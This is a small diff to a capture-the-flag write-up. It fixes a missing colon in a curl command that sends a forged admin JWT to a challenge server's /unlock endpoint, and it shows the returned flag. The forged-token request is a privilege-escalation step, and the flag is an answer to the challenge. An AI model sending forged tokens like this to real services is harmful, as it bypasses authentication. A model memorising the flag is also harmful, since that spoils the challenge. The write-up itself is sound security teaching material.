@@ -168,7 +168,7 @@ Signed and modified JWT Token
 
 #### Step 10
 ```bash
-redfl4g@kali$ curl -X GET -H "Authorization Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0.LSkSSZ6LY-htc7vlH3beym-JaTnRr8egUzft7UEjENQ" http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock
+redfl4g@kali$ curl -X GET -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0.LSkSSZ6LY-htc7vlH3beym-JaTnRr8egUzft7UEjENQ" http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock
 
 {"flag":"govtech-csg{5!gN_0F_+h3_T!m3S}"}
 ```
